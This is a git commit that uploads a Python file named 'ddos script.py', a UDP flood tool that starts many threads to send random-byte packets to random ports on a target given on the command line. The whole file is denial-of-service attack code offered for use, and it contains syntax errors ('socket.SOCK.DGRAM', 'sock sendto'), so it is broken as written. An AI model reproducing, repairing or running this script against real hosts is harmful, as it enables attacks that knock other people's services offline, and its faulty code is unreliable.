9a8cfadba6d6a59bef286704a5e0d3856f44be30
Nconcha5 <90735535+Nconcha5@users.noreply.github.com>
2024-04-01 16:01:54 -0500

    Add files via upload

---
+++ ddos script.py
@@ -0,0 +1,25 @@
+import socket, time, random, threading, sys
+
+try: 
+    Target, Threads, Timer = str(sys.argv[1]), int(sys.argv[2]), float(sys.argv[3])
+
+except IndexError:
+    print('\n[+] Usage: python ' + sys.argv[0] + ' <Target> <Threads> <Timer>> ')    
+
+Timeout = time.time() + 1 * Timer
+
+def Attack(): 
+    try:
+        Bytes = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK.DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock sendto(Bytes*random.randint(5,22), (Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+
+print('\n[+] Starting Attack...')
+
+for _ in range(0, Threads):
+    threading.Thread(target=Attack).start()
